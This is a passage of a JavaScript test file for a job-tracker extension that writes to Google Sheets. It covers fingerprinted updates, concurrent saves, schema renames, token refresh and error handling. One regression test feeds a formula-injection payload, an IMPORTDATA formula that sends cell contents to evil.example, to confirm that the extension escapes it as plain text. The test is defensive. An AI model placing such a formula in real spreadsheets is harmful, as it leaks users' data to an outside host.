  test('find -> update -> update -> delete works with refreshed fingerprints', async () => {
    const { id, tabId } = await setup();
    const found = await send({ type: 'FIND_APPLICATION', extractedData: JOB });
    const u1 = await upd(id, tabId, { expectedFingerprint: found.rowFingerprint });
    expect(u1).toMatchObject({ success: true, updated: true, rowIndex: 1 });
    expect(u1.rowFingerprint).not.toBe(found.rowFingerprint);
    const u2 = await send({
      type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData: JOB,
      userInputs: { dropdown_5: 'Offer' }, existingRowIndex: 1, expectedFingerprint: u1.rowFingerprint,
    });
    expect(u2.success).toBe(true);
    expect(google.cells(id, 'Applications')[1][5]).toBe('Offer');
    const del = await send({
      type: 'DELETE_JOB', spreadsheetId: id, tabId, rowIndex: 1, expectedFingerprint: u2.rowFingerprint,
    });
    expect(del.success).toBe(true);
    expect(google.cells(id, 'Applications')).toHaveLength(2);
  });

  test('a failed fingerprint read after a successful write does not fail the save', async () => {
    const { id, tabId } = await setup();
    const realRoute = google.route.bind(google);
    google.route = async (url, ...rest) => {
      // Single-row reads (A<n>:ZZ<n>) are the post-write fingerprint reads.
      const m = /!A(\d+)%3AZZ(\d+)/.exec(url);
      if (m && m[1] === m[2] && (rest[0] || 'GET') === 'GET') {
        throw new ApiError(503, 'The service is currently unavailable.');
      }
      return realRoute(url, ...rest);
    };
    const appended = await send({
      type: 'SAVE_JOB', spreadsheetId: id, tabId,
      extractedData: { ...JOB, url: 'https://example.com/jobs/other-1', jobId: 'other-1', company: 'Zeta', role: 'Chef' },
      userInputs: {},
    });
    expect(appended).toMatchObject({ success: true, rowFingerprint: null });
    expect(google.cells(id, 'Applications')).toHaveLength(4);
    const updated = await upd(id, tabId, {});
    expect(updated).toMatchObject({ success: true, updated: true, rowFingerprint: null });
  });

  test('missing fingerprint keeps the old behaviour', async () => {
    const { id, tabId } = await setup();
    expect((await upd(id, tabId, {})).success).toBe(true);
    expect((await send({ type: 'DELETE_JOB', spreadsheetId: id, tabId, rowIndex: 1 })).success).toBe(true);
  });
});

// ------------------------------------------------- review round 3 regressions

describe('round 3 regressions', () => {
  async function newTracker(title = 'R3') {
    const created = await send({ type: 'CREATE_SHEET', title });
    return { id: created.sheet.spreadsheetId, tabId: created.sheet.tabs[0].gid };
  }
  const save = (id, tabId, extractedData, extra = {}) =>
    send({ type: 'SAVE_JOB', spreadsheetId: id, tabId, extractedData, userInputs: {}, ...extra });

  test('a double-clicked Save adds exactly one row (second reports already applied)', async () => {
    const { id, tabId } = await newTracker();
    const [a, b] = await Promise.all([save(id, tabId, JOB), save(id, tabId, JOB)]);
    expect([a.success, b.success].sort()).toEqual([false, true]);
    expect([a, b].find((r) => !r.success).alreadyApplied).toBe(true);
    expect(google.cells(id, 'Applications')).toHaveLength(2); // header + one job
  });

  test('saves to different jobs at the same time are both kept in order', async () => {
    const { id, tabId } = await newTracker();
    const [a, b] = await Promise.all([save(id, tabId, JOB), save(id, tabId, JOB2)]);
    expect(a.success && b.success).toBe(true);
    const grid = google.cells(id, 'Applications');
    expect(grid.map((r) => r[2])).toEqual(['Company Name', 'Acme Corp', 'Globex']);
  });

  test('two schema edits at once are both applied (no lost update)', async () => {
    const { id, tabId } = await newTracker();
    const rename = (columnIndex, newHeader) =>
      send({
        type: 'APPLY_SCHEMA_CHANGE', spreadsheetId: id, tabId,
        change: { op: 'rename', columnIndex, newHeader },
      });
    const [a, b] = await Promise.all([rename(4, 'Where'), rename(6, 'Remarks')]);
    expect(a.success && b.success).toBe(true);
    const tab = (await getSheets())[0].tabs[0];
    expect(tab.headers[4]).toBe('Where');
    expect(tab.headers[6]).toBe('Remarks');
    expect(google.cells(id, 'Applications')[0][4]).toBe('Where');
    expect(google.cells(id, 'Applications')[0][6]).toBe('Remarks');
  });

  test('page-supplied text that looks like a formula is stored as plain text', async () => {
    const { id, tabId } = await newTracker();
    const res = await save(id, tabId, {
      company: '=IMPORTDATA("http://evil.example/?"&A1)',
      role: '=1+1',
      location: '@SUM(A1)',
      url: '',
      jobId: '+SUM(1)',
    });
    expect(res.success).toBe(true);
    const [, , company, role, location] = google.cells(id, 'Applications')[1];
    const jobId = google.cells(id, 'Applications')[1][1];
    expect(company).toBe(`'=IMPORTDATA("http://evil.example/?"&A1)`);
    expect(role).toBe("'=1+1"); // no URL to link => plain text, not a formula
    expect(location).toBe("'@SUM(A1)");
    expect(jobId).toBe("'+SUM(1)");
  });

  test('FIND_APPLICATION refreshes an expired token instead of reporting "no match"', async () => {
    const { id, tabId } = await newTracker();
    expect((await save(id, tabId, JOB)).success).toBe(true);
    signIn({ accessToken: 'tok-revoked' }); // looks fresh locally; Google answers 401
    const res = await send({ type: 'FIND_APPLICATION', extractedData: JOB });
    expect(res.success).toBe(true);
    expect(res.matched).toBe(true);
    expect(google.refreshCount).toBe(1);
  });

  test('an error that merely mentions "401" (status 400) does not open the sign-in window', async () => {
    const id = sid(77);
    google.add(id, { tabs: [{ title: '401', rows: [['Company', 'Role']] }] });
    const realRoute = google.route.bind(google);
    google.route = async (url, ...rest) => {
      if (url.includes('/values/')) throw new ApiError(400, "Unable to parse range: '401'!A1:ZZ500");
      return realRoute(url, ...rest);
    };
    const res = await send({ type: 'ADD_SHEET', url: editUrl(id) });
    expect(res.success).toBe(false);
    expect(res.error).toMatch(/Unable to parse range/); // the real reason, not "access expired"
    expect(google.refreshCount).toBe(0); // no token reset / re-auth attempt
    expect(store.googleToken.accessToken).toBe('tok-1');
  });

  test('a 401 while connecting the 2nd picked sheet still reports both as added after the retry', async () => {
    const a = sid(90);
    const b = sid(91);
    google.add(a, { title: 'A' });
    google.add(b, { title: 'B' });
    // Token is valid for the first sheet, then Google revokes it mid-batch.
    const realRoute = google.route.bind(google);
    let revoked = false;
    google.route = async (url, method, options) => {
      if (!revoked && url.includes(b)) {
        revoked = true;
        google.validTokens.delete('tok-1');
      }
      return realRoute(url, method, options);
    };
    const res = await sendExternal(
      { type: 'SHEETS_PICKED', files: [{ id: a, name: 'A' }, { id: b, name: 'B' }] },
      pickerSender
    );
    expect(res.success).toBe(true);
    expect(res.added).toBe(2);
    expect((await getSheets()).map((s) => s.spreadsheetId).sort()).toEqual([a, b].sort());
  });
});
